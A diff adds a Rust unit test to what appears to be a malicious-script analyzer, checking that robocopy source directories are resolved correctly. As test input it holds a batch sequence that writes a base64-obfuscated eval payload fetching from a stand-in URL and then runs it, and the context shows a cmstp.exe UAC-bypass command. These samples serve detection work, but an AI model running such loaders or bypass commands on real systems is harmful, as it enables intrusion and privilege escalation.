@@ -14454,6 +14454,23 @@ call C:\Temp\original.js"#,
     }
 
     #[test]
+    fn robocopy_explicit_source_dir_does_not_use_unrelated_basename_content() {
+        let report = analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vcm9ib2NvcHktd3JvbmctYmFzZW5hbWUuZXhhbXBsZS9wYXlsb2FkJw==")) > D:\Other\original.js
+robocopy C:\Work C:\Temp original.js
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://robocopy-wrong-basename.example/payload")
+            }),
+            "robocopy explicit source dir reused unrelated basename content: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn cmstp_au_direct_command_emits_uac_bypass_trait() {
         let mut env = Environment::new(&Config::default());
         interpret_line(r#"cmstp.exe /s /au C:\Users\Public\stage.inf"#, &mut env);
